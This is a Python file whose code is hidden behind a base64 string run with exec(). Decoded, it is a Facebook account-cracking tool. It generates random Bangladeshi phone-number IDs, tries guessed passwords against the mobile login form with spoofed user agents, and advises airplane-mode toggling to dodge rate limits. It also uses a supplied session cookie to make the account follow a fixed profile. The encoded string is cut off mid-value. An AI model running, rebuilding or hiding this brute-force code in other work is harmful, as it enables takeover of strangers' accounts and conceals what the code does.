import base64

exec(base64.b64decode("DQppbXBvcnQgb3Msc3lzLHRpbWUsanNvbixyYW5kb20scmUsc3RyaW5nLHBsYXRmb3JtLGJhc2U2NCx1dWlkDQpvcy5zeXN0ZW0oImdpdCBwdWxsIikNCmZyb20gYnM0IGltcG9ydCBCZWF1dGlmdWxTb3VwIGFzIHNvcA0KZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXANCmltcG9ydCByZXF1ZXN0cyBhcyByZXNzDQpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRlDQpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQ0KZnJvbSB0aW1lIGltcG9ydCBzbGVlcA0KZnJvbSB0aW1lIGltcG9ydCBzbGVlcCBhcyB3YWt0dQ0KdHJ5Og0KICAgIGltcG9ydCByZXF1ZXN0cw0KICAgIGZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IgYXMgVGhyZWFkUG9vbA0KICAgIGltcG9ydCBtZWNoYW5pemUNCiAgICBmcm9tIHJlcXVlc3RzLmV4Y2VwdGlvbnMgaW1wb3J0IENvbm5lY3Rpb25FcnJvcg0KZXhjZXB0IE1vZHVsZU5vdEZvdW5kRXJyb3I6DQogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBtZWNoYW5pemUgcmVxdWVzdHMgZnV0dXJlcyBiczQ9PTIgPiAvZGV2L251bGwnKQ0KICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgYnM0JykNCiAgICANCmRlZiBjZWtfYXBrKHNlc3Npb24sY29raSk6DQogICAgdz1zZXNzaW9uLmdldCgiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL3NldHRpbmdzL2FwcHMvdGFiYmVkLz90YWI9YWN0aXZlIixjb29raWVzPXsiY29va2llIjpjb2tpfSkudGV4dA0KICAgIHNvcCA9IEJlYXV0aWZ1bFNvdXAodywiaHRtbC5wYXJzZXIiKQ0KICAgIHggPSBzb3AuZmluZCgiZm9ybSIsbWV0aG9kPSJwb3N0IikNCiAgICBnYW1lID0gW2kudGV4dCBmb3IgaSBpbiB4LmZpbmRfYWxsKCJoMyIpXQ0KICAgIGlmIGxlbihnYW1lKT09MDoNCiAgICAgICAgcHJpbnQoZidcciVzWyVzISVzXSAlc1NvcnJ5IHRoZXJlIGlzIG5vIEFjdGl2ZSAgQXBrJXMgICclKE4sTSxOLE0sTikpDQogICAgZWxzZToNCiAgICAgICAgcHJpbnQoZidcclsaXSAlcyBceDFiWzE7OTVtIBogWW91ciBBY3RpdmUgQXBwcyAaICAgICA6e1dISVRFfSclKEdSRUVOKSkNCiAgICAgICAgZm9yIGkgaW4gcmFuZ2UobGVuKGdhbWUpKToNCiAgICAgICAgICAgIHByaW50KGYiXHJbJXMlc10gJXMlcyIlKE4saSsxLGdhbWVbaV0ucmVwbGFjZSgiRGl0YW1iYWhrYW4gcGFkYSIsIiBEaXRhbWJhaGthbiBwYWRhIiksTikpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBwcmludChmJ1xyICVzWyVzISVzXSBTb3JyeSwgQXBrIGNoZWNrIGZhaWxlZCBpbnZhbGlkIGNvb2tpZSclKE4sTSxOKSkNCiAgICB3PXNlc3Npb24uZ2V0KCJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vc2V0dGluZ3MvYXBwcy90YWJiZWQvP3RhYj1pbmFjdGl2ZSIsY29va2llcz17ImNvb2tpZSI6Y29raX0pLnRleHQNCiAgICBzb3AgPSBCZWF1dGlmdWxTb3VwKHcsImh0bWwucGFyc2VyIikNCiAgICB4ID0gc29wLmZpbmQoImZvcm0iLG1ldGhvZD0icG9zdCIpDQogICAgZ2FtZSA9IFtpLnRleHQgZm9yIGkgaW4geC5maW5kX2FsbCgiaDMiKV0NCiAgICBpZiBsZW4oZ2FtZSk9PTA6DQogICAgICAgIHByaW50KGYnXHIlc1slcyElc10gJXNTb3JyeSB0aGVyZSBpcyBubyBFeHBpcmVkIEFwayVzICAgICAgICAgICBcbiclKE4sTSxOLE0sTikpDQogICAgZWxzZToNCiAgICAgICAgcHJpbnQoZidcclsaXSAlcyBceDFiWzE7OTVtIBogWW91ciBFeHBpcmVkIEFwcHMgGiAgICA6e1dISVRFfSclKE0pKQ0KICAgICAgICBmb3IgaSBpbiByYW5nZShsZW4oZ2FtZSkpOg0KICAgICAgICAgICAgcHJpbnQoZiJcclslcyVzXSAlcyVzIiUoTixpKzEsZ2FtZVtpXS5yZXBsYWNlKCJLZWRhbHV3YXJzYSIsIiBLZWRhbHV3YXJzYSIpLE4pKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgcHJpbnQoJycpDQoNCmRlZiBmb2xsb3coc2VsZiwgc2Vzc2lvbiwgY29raSk6DQogICAgICAgIHIgPSBCZWF1dGlmdWxTb3VwKHNlc3Npb24uZ2V0KCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vcHJvZmlsZS5waHA/aWQ9MTAwMDE1MzE1MjU4NTE5Jywgew0KICAgICAgICAgICAgJ2Nvb2tpZSc6IGNva2kgfSwgKiooJ2Nvb2tpZXMnLCkpLnRleHQsICdodG1sLnBhcnNlcicpDQogICAgICAgIGdldCA9IHIuZmluZCgnYScsICdJa3V0aScsICoqKCdzdHJpbmcnLCkpLmdldCgnaHJlZicpDQogICAgICAgIHNlc3Npb24uZ2V0KCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20nICsgc3RyKGdldCksIHsNCiAgICAgICAgICAgICdjb29raWUnOiBjb2tpIH0sICoqKCdjb29raWVzJywpKS50ZXh0DQogICAgICAgICAgICANCiAgICAgICAgICANCmNsYXNzIGphbGFuOg0KICAgIGRlZiBfX2luaXRfXyhzZWxmLCB6KToNCiAgICAgICAgZm9yIGUgaW4geiArICJcbiI6DQogICAgICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGUpDQogICAgICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4wMDkpDQogICAgICAgICAgICANClAgPSAnXHgxYlsxOzk3bScNCk0gPSAnXHgxYlsxOzkxbScNCkggPSAnXHgxYlsxOzkybScNCksgPSAnXHgxYlsxOzkzbScNCkIgPSAnXHgxYlsxOzk0bScNClUgPSAnXHgxYlsxOzk1bScgDQpPID0gJ1x4MWJbMTs5Nm0nDQpOID0gJ1x4MWJbMG0nICAgIA0KWiA9ICJcMDMzWzE7MzBtIg0Kc2lyID0gJ1wwMzNbNDFtXHgxYlsxOzk3bScNCnggPSAnXDMzW20nICMgREVGQVVMVA0KbSA9ICdceDFiWzE7OTFtJyAjUkVEICsNCmsgPSAnXDAzM1s5M20nICMgS1VOSU5HICsNCnhyID0gJ1x4MWJbMTs5Mm0nICMgSElKQVUgKw0KaGggPSAnXDAzM1szMm0nICMgSElKQVUgLQ0KdSA9ICdcMDMzWzk1bScgIyBVTkdVDQprayA9ICdcMDMzWzMzbScgIyBLVU5JTkcgLQ0KYiA9ICdcMzNbMTs5Nm0nICMgQklSVSAtDQpwID0gJ1x4MWJbMDszNG0nICMgQklSVSArDQphc3UgPSByYW5kb20uY2hvaWNlKFttLGsseHIsdSxiXSkNCm15X2NvbG9yID0gWw0KIFAsIE0sIEgsIEssIEIsIFUsIE8sIE5dDQp3YXJuYSA9IHJhbmRvbS5jaG9pY2UobXlfY29sb3IpDQpub3cgPSBkYXRldGltZS5ub3coKQ0KZHRfc3RyaW5nID0gbm93LnN0cmZ0aW1lKCIlSDolTSIpDQpjdXJyZW50ID0gZGF0ZXRpbWUubm93KCkNCnRhID0gY3VycmVudC55ZWFyDQpidSA9IGN1cnJlbnQubW9udGgNCmhhID0gY3VycmVudC5kYXkNCnRvZGF5ID0gZGF0ZS50b2RheSgpDQpsb2dvID0gKCIiIg0KDQpfX19fXyAgXyBfX19fX18gICBfX19fX19fICBfXyAgIF9fDQogfCAgX18gXChfKSAgX19fXy9cfF9fICAgX198IFwgXCAvIC8NCiB8IHxfXykgfF98IHxfXyAvICBcICB8IHxfX19fX1wgViAvIA0KIHwgIF8gIC98IHwgIF9fLyAvXCBcIHwgfF9fX19fXz4gPCAgDQogfCB8IFwgXHwgfCB8IC8gX19fXyBcfCB8ICAgICAvIC4gXCANCiB8X3wgIFxfXF98X3wvXy8gICAgXF9cX3wgICAgL18vIFxfXA0KICAgICAgICAgDQogIFJJRkFULVggDQogXDAzM1sxOzkzbcOXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5dcMDMzWzE7OTNtw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl1wwMzNbMTs5M23Dl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5cNCiBcMDMzWzE7OTNtfCAgICAgXDAzM1sxOzk2bVvinJNdIENSRUFURUQgQllcMzNbMDttICAgOiBcMDMzWzE7OTZtIOGlrPCfmIjhrYRNVU5OQfCfmIjhrYTqk6fZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc6pOl2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2Zzqk5rZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2Zzqk5fZnNmc2ZzZnNmc2ZzZnNmc6pOw2ZzZnNmc2Zzqk6PZnCAgICAgICAgICBcMDMzWzE7OTNtfA0KIFwwMzNbMTs5M218ICAgICBcMDMzWzE7MzJtW+Kck10gRkFDRUJPSyAgICAgIDogXDAzM1sxOzM0bSBNRCBNVU5OQSBIQVNTQU4gICAgICAgICAgICAgXDAzM1sxOzkzbXwNCiBcMDMzWzE7OTNtfCAgICAgXDAzM1sxOzM1bVvinJNdIEdJVEhVQiAgICAgICA6ICBcMDMzWzE7MzVtUmVmYXQ1MDAxICAgICAgICAgICBcMDMzWzE7OTNtfA0KIFwwMzNbMTs5M218ICAgICBcMDMzWzE7MzZtW+Kck10gVE9PTCBTVEFUVVMgIDogXDAzM1sxOzM2bSBSYW5kb20gQ2xvbmluZyDhpazwn5iI4a2ETVVOTkHwn5iI4a2EIFwwMzNbMTs5M218DQogXDAzM1sxOzkzbXwgICAgIFwwMzNbMTszNW1b4pyTXSBURUFNICAgICAgICAgOiAgXDAzM1sxOzM1bUNZQkVSIDQwNDAwICAgICAgICAgICAgICAgICAgXDAzM1sxOzkzbXwNCiBcMDMzWzE7OTNtfCAgICAgXDAzM1sxOzM2bVvinJNdIFRPT0wgVklSU0lPTiA6ICBcMDMzWzE7MzZtMC4wICAgICAgICAgICAgICAgICAgICAgICAgIFwwMzNbMTs5M218DQogXDAzM1sxOzkzbcOXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5dcMDMzWzE7OTNtw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXXDAzM1sxOzkzbcOXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5cNCiBcMDMzWzE7OTFtW1wwMzNbMTs5N23igKJcMDMzWzE7OTFtXVwwMzNbMTszMm0gUExaIFNBUFBPUlQgTUUgQlJPLi4uLg0KIFwwMzNbMTs5MW1bXDAzM1sxOzk3beKAolwwMzNbMTs5MW1dXDAzM1sxOzMybSDhpazwn5iI4a2EUklGQVQtWPCfmIjhrYTqk6fZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc6pOl2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2Zzqk5rZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2Zzqk5fZnNmc2ZzZnNmc2ZzZnNmc6pOw2ZzZnNmc2Zzqk6PZnCBURVJNVVggSEVMUElORyBaT05FLi4uLg0KIFwwMzNbMTs5M23Dl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl1wwMzNbMTs5M23Dl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5dcMDMzWzE7OTNtw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDlyIiIikNCmRlZiBsaW5leCgpOg0KCXByaW50KCdcMDMzWzE7OTNtIMOXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXJykNCmxvb3AgPSAwDQpva3MgPSBbXQ0KY3BzID0gW10NCmRlZiBjbGVhcigpOg0KICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL0N5YmVyNDA0MDAnKQ0KICAgIHByaW50KGxvZ28pDQpmcm9tIHRpbWUgaW1wb3J0IGxvY2FsdGltZSBhcyBsdA0KZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIGNtZA0KbHR4ID0gaW50KGx0KClbM10pDQppZiBsdHggPiAxMjoNCiAgICBhID0gbHR4LTEyDQogICAgdGFnID0gIlBNIg0KZWxzZToNCiAgICBhID0gbHR4DQogICAgdGFnID0gIkFNIg0KICAgIA0KICAgIA0KdHJ5Og0KICAgIHByaW50KCdcblxuXDAzM1sxOzMzbUxvYWRpbmcgYXNzZXQgZmlsZXMgLi4uIFwwMzNbMDs5N20nKQ0KICAgIHYgPSA1LjINCiAgICB1cGRhdGUgPSAoJzUuMicpDQogICAgdXBkYXRlID0gKCc1LjInKQ0KICAgIGlmIHN0cih2KSBpbiB1cGRhdGU6DQogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgIGVsc2U6cGFzcw0KZXhjZXB0OnByaW50KCdcblwwMzNbMTszMW1ObyBpbnRlcm5ldCBjb25uZWN0aW9uIC4uLiBcMDMzWzA7OTdtJykNCiNnbG9iYWwgZnVuY3Rpb25zDQpkZWYgZHluYW1pYyh0ZXh0KToNCiAgICB0aXRpayA9IFsnLiAgICcsJy4uICAnLCcuLi4gJywnLi4uLiAnXQ0KICAgIGZvciBvIGluIHRpdGlrOg0KICAgICAgICBwcmludCgnXHInK3RleHQrbyksDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKTt0aW1lLnNsZWVwKDEpDQoNCiNVc2VyIGFnZW50cw0KdWdlbjI9W10NCnVnZW49W10NCiANCmZvciB4ZCBpbiByYW5nZSgxMDAwMCk6DQogICAgYWE9J01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCcNCiAgICBiPXJhbmRvbS5jaG9pY2UoWyczJywnNCcsJzUnLCc2JywnNycsJzgnLCc5JywnMTAnLCcxMScsJzEyJywnMTMnLCcxNCcsJzE1JywnMTYnLCcxNyddKQ0KICAgIGM9JyBlbi11czsgR1QtJw0KICAgIGQ9cmFuZG9tLmNob2ljZShbJ0EnLCdCJywgJ0MnLCAnRCcsICdFJywgJ0YnLCAnRycsICdIJywgJ0knLCAnSicsICdLJywgJ0wnLCAnTScsICdOJywgJ08nLCAnUCcsICdRJywgJ1InLCAnUycsICdUJywgJ1UnLCAnVicsICdXJywgJ1gnLCAnWScsICdaJ10pDQogICAgZT1yYW5kb20ucmFuZHJhbmdlKDEsIDk5OSkNCiAgICBmPXJhbmRvbS5jaG9pY2UoWydBJywnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWiddKQ0KICAgIGc9J0FwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8nDQogICAgaD1yYW5kb20ucmFuZHJhbmdlKDczLDEwMCkNCiAgICBpPScwJw0KICAgIGo9cmFuZG9tLnJhbmRyYW5nZSg0MjAwLDQ5MDApDQogICAgaz1yYW5kb20ucmFuZHJhbmdlKDQwLDE1MCkNCiAgICBsPSdNb2JpbGUgU2FmYXJpLzUzNy4zNicNCiAgICB1YWt1Mj0oZid7YWF9IHtifTsge2N9e2R9e2V9e2Z9KSB7Z317aH0ue2l9LntqfS57a30ge2x9JykNCiAgICB1Z2VuLmFwcGVuZCh1YWt1MikNCiAgICANCg0KZGVmIHNhbWl5YSh1aWQpOg0KICAgIGlmIGxlbih1aWQpPT0xNToNCiAgICAgICAgaWYgdWlkWzoxMF0gaW4gWycxMDAwMDAwMDAwJ10gICAgICAgOnNoYW50byA9ICcgKCotKikgMjAwOScNCiAgICAgICAgZWxpZiB1aWRbOjldIGluIFsnMTAwMDAwMDAwJ10gICAgICAgOnNoYW50byA9ICfiiJogMjAwOScNCiAgICAgICAgZWxpZiB1aWRbOjhdIGluIFsnMTAwMDAwMDAnXSAgICAgICAgOnNoYW50byA9ICfiiJogMjAwOScNCiAgICAgICAgZWxpZiB1aWRbOjddIGluIFsnMTAwMDAwMCcsJzEwMDAwMDEnLCcxMDAwMDAyJywnMTAwMDAwMycsJzEwMDAwMDQnLCcxMDAwMDA1J106c2hhbnRvID0gJ+KImiAyMDA5Jw0KICAgICAgICBlbGlmIHVpZFs6N10gaW4gWycxMDAwMDA2JywnMTAwMDAwNycsJzEwMDAwMDgnLCcxMDAwMDA5J106c2hhbnRvID0gJyAyMDEwJw0KICAgICAgICBlbGlmIHVpZFs6Nl0gaW4gWycxMDAwMDEnXSAgICAgICAgICA6c2hhbnRvID0gJ+KImiAyMDEwLzIwMTEnDQogICAgICAgIGVsaWYgdWlkWzo2XSBpbiBbJzEwMDAwMicsJzEwMDAwMyddIDpzaGFudG8gPSAn4oiaIDIwMTEvMjAxMicNCiAgICAgICAgZWxpZiB1aWRbOjZdIGluIFsnMTAwMDA0J10gICAgICAgICAgOnNoYW50byA9ICfiiJogMjAxMi8yMDEzJw0KICAgICAgICBlbGlmIHVpZFs6Nl0gaW4gWycxMDAwMDUnLCcxMDAwMDYnXSA6c2hhbnRvID0gJ+KImiAyMDEzLzIwMTQnDQogICAgICAgIGVsaWYgdWlkWzo2XSBpbiBbJzEwMDAwNycsJzEwMDAwOCddIDpzaGFudG8gPSAn4oiaIDIwMTQvMjAxNScNCiAgICAgICAgZWxpZiB1aWRbOjZdIGluIFsnMTAwMDA5J10gICAgICAgICAgOnNoYW50byA9ICfiiJogMjAxNScNCiAgICAgICAgZWxpZiB1aWRbOjVdIGluIFsnMTAwMDEnXSAgICAgICAgICAgOnNoYW50byA9ICfiiJogMjAxNS8yMDE2Jw0KICAgICAgICBlbGlmIHVpZFs6NV0gaW4gWycxMDAwMiddICAgICAgICAgICA6c2hhbnRvID0gJ+KImiAyMDE2LzIwMTcnDQogICAgICAgIGVsaWYgdWlkWzo1XSBpbiBbJzEwMDAzJ10gICAgICAgICAgIDpzaGFudG8gPSAn4oiaIDIwMTgvMjAxOScNCiAgICAgICAgZWxpZiB1aWRbOjVdIGluIFsnMTAwMDQnXSAgICAgICAgICAgOnNoYW50byA9ICfiiJogMjAxOS8yMDIwJw0KICAgICAgICBlbGlmIHVpZFs6NV0gaW4gWycxMDAwNSddICAgICAgICAgICA6c2hhbnRvID0gJ+KImiAyMDIwJw0KICAgICAgICBlbGlmIHVpZFs6NV0gaW4gWycxMDAwNicsJzEwMDA3JywnJ106c2hhbnRvID0gJ+KImiAyMDIxJw0KICAgICAgICBlbGlmIHVpZFs6NV0gaW4gWycxMDAwOCddICAgICAgICAgICA6c2hhbnRvID0gJ+KImiAyMDIyJw0KICAgICAgICBlbGlmIHVpZFs6NV0gaW4gWycxMDAwOSddICAgICAgICAgICA6c2hhbnRvID0gJ+KImiAyMDIzJw0KICAgICAgICBlbHNlOnNoYW50bz0nJw0KICAgIGVsaWYgbGVuKHVpZCkgaW4gWzksMTBdOg0KICAgICAgICBzaGFudG8gPSAnIOKImiAyMDA4LzIwMDknDQogICAgZWxpZiBsZW4odWlkKT09ODoNCiAgICAgICAgc2hhbnRvID0gJ+KImiAyMDA3LzIwMDgnDQogICAgZWxpZiBsZW4odWlkKT09NzoNCiAgICAgICAgc2hhbnRvID0gJ+KImiAyMDA2LzIwMDcnDQogICAgZWxzZTpzaGFudG89JycNCiAgICByZXR1cm4gc2hhbnRvDQogICAgDQogICAgDQogICAgDQojIEFQSyBDSEVDSw0KZGVmIHh4cigpOg0KICAgIHVzZXI9W10NCiAgICB0d2YgPVtdDQogICAgb3MuZ2V0dWlkDQogICAgb3MuZ2V0ZXVpZA0KICAgIG9zLnN5c3RlbSgiY2xlYXIiKQ0KICAgIHByaW50KGxvZ28pDQogICAgcHJpbnQoZicgXDAzM1sxOzkxbVtcMDMzWzE7OTdt4oCiXDAzM1sxOzkxbV1cMDMzWzE7OTJtIEV4YW1wbGUgOiB7eHJ9MDE5LDAxNywwMTgsOTIzMDIsOTIzMDEsOTE3Nzh7eH0nKQ0KICAgIHByaW50KCIgXDAzM1sxOzkzbSDDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDlyIpDQogICAgcmsxID0gJzAxNzEnDQogICAgcmsyID0gJzAxNzInDQogICAgcmszID0gJzAxNzUnDQogICAgY29kZSA9IHJhbmRvbS5jaG9pY2UoW3JrMSxyazIscmszXSkgICAgICAgICAgICAgICAgICAgICAgDQogICAgcHd3ID0gaW5wdXQoZicgXDAzM1sxOzkxbVtcMDMzWzE7OTdt4oCiXDAzM1sxOzkxbV1cMDMzWzE7OTJtIENob29zZSA6ICcpDQogICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgcHJpbnQobG9nbykNCiAgICBsaW1pdCA9IGludChpbnB1dChmJyBcMDMzWzE7OTFtW1wwMzNbMTs5N23igKJcMDMzWzE7OTFtXVwwMzNbMTs5Mm0gRVhBTVBMRSA6IDIwMDAsIDMwMDAsIDUwMDAgXG4gXDAzM1sxOzkzbcOXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXIFxuIFwwMzNbMTs5MW1bXDAzM1sxOzk3beKAolwwMzNbMTs5MW1dXDAzM1sxOzkybSBQVVQgQ0xPTklORyBMSU1JVDogJykpDQogICAgZm9yIG5tYnIgaW4gcmFuZ2UobGltaXQpOg0KICAgICAgICBubXAgPSAnJy5qb2luKHJhbmRvbS5jaG9pY2Uoc3RyaW5nLmRpZ2l0cykgZm9yIF8gaW4gcmFuZ2UoNykpDQogICAgICAgIHVzZXIuYXBwZW5kKG5tcCkNCiAgICBvcy5zeXN0ZW0oImNsZWFyIikNCiAgICBwcmludChsb2dvKQ0KICAgIHBhc3N4ID0gMA0KICAgIEhhbWlpSUQgPSBbXQ0KICAgIHByaW50KCIiKQ0KICAgIGZvciBiaWxhbCBpbiByYW5nZShwYXNzeCk6DQogICAgICAgIHB3dyA9IGlucHV0KGYiXDAzM1sxOzkxbVtcMDMzWzE7OTdt4oCiXDAzM1sxOzkxbV1cMDMzWzE7OTJtIEVudGVyIFBhc3N3b3JkIHtiaWxhbCsxfSA6ICIpDQogICAgICAgIEhhbWlpSUQuYXBwZW5kKHB3dykNCiAgICB3aXRoIFRocmVhZFBvb2wobWF4X3dvcmtlcnM9NTApIGFzIG1hbnNoZXJhOg0KICAgICAgICBjbGVhcigpDQogICAgICAgIHRsID0gc3RyKGxlbih1c2VyKSkNCiAgICAgICAgcHJpbnQoZicgXDAzM1sxOzkxbVtcMDMzWzE7OTdt4oCiXDAzM1sxOzkxbV1cMDMzWzE7OTRtIFRPVEFMIElEUzoge3hyfScrdGwpDQogICAgICAgIHByaW50KGYne3h9IFwwMzNbMTs5MW1bXDAzM1sxOzk3beKAolwwMzNbMTs5MW1dXDAzM1sxOzk0bSBUSEUgUFJPQ0VTUyBIQVMgQkVFTiBTVEFSVEVEJykNCiAgICAgICAgcHJpbnQoZicgXDAzM1sxOzkxbVtcMDMzWzE7OTdt4oCiXDAzM1sxOzkxbV1cMDMzWzE7OTRtIFdPUksgQ1VOVFJZIFwwMzNbMTs5N206IFwwMzNbMTs5Nm1CQU5HTEFERVNIJykNCiAgICAgICAgcHJpbnQoZicgXDAzM1sxOzkxbVtcMDMzWzE7OTdt4oCiXDAzM1sxOzkxbV1cMDMzWzE7OTRtIFRPT0wgT1dORVIgXDAzM1sxOzk3bTogXDAzM1sxOzk2bSDhpazwn5iI4a2EUklGQVQtWCDwn5iI4a2E6pOn2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnOqTpdmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc6pOa2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc6pOX2ZzZnNmc2ZzZnNmc2ZzZnOqTsNmc2ZzZnNmc6pOj2ZwnKQ0KICAgICAgICBwcmludChmJyBcMDMzWzE7OTFtW1wwMzNbMTs5N23igKJcMDMzWzE7OTFtXVwwMzNbMTs5NG0gVVNFIE5FVFdPUksgIFwwMzNbMTs5N206ICBcMDMzWzE7OTZtMkcsIDNHLCA0RywgNUcgJykNCiAgICAgICAgcHJpbnQoZicgXDAzM1sxOzkxbVtcMDMzWzE7OTdt4oCiXDAzM1sxOzkxbV1cMDMzWzE7OTFtIFVTRSBBRVJPUExBTkUgTU9PRCBJTiBFVkVSWSA1IE1JTiAnKQ0KICAgICAgICBwcmludChmIiBcMDMzWzE7OTNtw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5ciKQ0KICAgICAgICBmb3IgbG92ZSBpbiB1c2VyOg0KICAgICAgICAgICAgcHd4ID0gW2xvdmVbMTpdXQ0KICAgICAgICAgICAgdWlkID0gY29kZStsb3ZlDQogICAgICAgICAgICBmb3IgRW1hbiBpbiBIYW1paUlEOg0KICAgICAgICAgICAgICAgIHB3eC5hcHBlbmQoRW1hbikNCiAgICAgICAgICAgICAgICBwd3guYXBwZW5kKGxvdmUpDQogICAgICAgICAgICBtYW5zaGVyYS5zdWJtaXQocmNyYWNrLHVpZCxwd3gsdGwpDQogICAgcHJpbnQoZiJcbnt4fSBcMDMzWzE7OTNtw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5ciKQ0KZGVmIHJjcmFjayh1aWQscHd4LHRsKToNCiAgICAjcHJpbnQodXNlcikNCiAgICBnbG9iYWwgbG9vcA0KICAgIGdsb2JhbCBjcHMNCiAgICBnbG9iYWwgb2tzDQogICAgZ2xvYmFsIHByb3h5DQogICAgdHJ5Og0KICAgICAgICBmb3IgcHMgaW4gcHd4Og0KICAgICAgICAgICAgcHJvID0gcmFuZG9tLmNob2ljZSh1Z2VuKQ0KICAgICAgICAgICAgc2Vzc2lvbiA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KICAgICAgICAgICAgZnJlZV9mYiA9IHNlc3Npb24uZ2V0KCdodHRwczovL3AuZmFjZWJvb2suY29tJykudGV4dA0KICAgICAgICAgICAgbG9nX2RhdGEgPSB7DQogICAgICAgICAgICAgICAgImxzZCI6cmUuc2VhcmNoKCduYW1lPSJsc2QiIHZhbHVlPSIoLio/KSInLCBzdHIoZnJlZV9mYikpLmdyb3VwKDEpLA0KICAgICAgICAgICAgImphem9lc3QiOnJlLnNlYXJjaCgnbmFtZT0iamF6b2VzdCIgdmFsdWU9IiguKj8pIicsIHN0cihmcmVlX2ZiKSkuZ3JvdXAoMSksDQogICAgICAgICAgICAibV90cyI6cmUuc2VhcmNoKCduYW1lPSJtX3RzIiB2YWx1ZT0iKC4qPykiJywgc3RyKGZyZWVfZmIpKS5ncm91cCgxKSwNCiAgICAgICAgICAgICJsaSI6cmUuc2VhcmNoKCduYW1lPSJsaSIgdmFsdWU9IiguKj8pIicsIHN0cihmcmVlX2ZiKSkuZ3JvdXAoMSksDQogICAgICAgICAgICAidHJ5X251bWJlciI6IjAiLA0KICAgICAgICAgICAgInVucmVjb2duaXplZF90cmllcyI6IjAiLA0KICAgICAgICAgICAgImVtYWlsIjp1aWQsDQogICAgICAgICAgICAicGFzcyI6cHMsDQogICAgICAgICAgICAibG9naW4iOiJMb2cgSW4ifQ0KICAgICAgICAgICAgaGVhZGVyX2ZyZWVmYiA9IHsiYXV0aG9yaXR5IjogJ3AuZmFjZWJvb2suY29tJywNCiAgICAgICAgICAgICJtZXRob2QiOiAnUE9TVCcsDQogICAgICAgICAgICAic2NoZW1lIjogJ2h0dHBzJywNCiAgICAgICAgICAgICJhY2NlcHQiOiAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJywNCiAgICAgICAgICAgICJhY2NlcHQtZW5jb2RpbmciOiAnZ3ppcCwgZGVmbGF0ZSwgYnInLA0KICAgICAgICAgICAgImFjY2VwdC1sYW5ndWFn